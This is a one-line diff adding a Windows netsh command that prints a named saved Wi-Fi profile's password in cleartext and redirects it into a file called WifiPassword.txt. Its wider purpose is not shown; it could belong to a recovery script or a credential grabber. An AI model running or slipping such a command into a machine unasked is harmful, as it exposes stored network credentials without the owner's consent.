@@ -1,0 +1,1 @@
+netsh wlan show profile %wifiname% key=clear>WifiPassword.txt
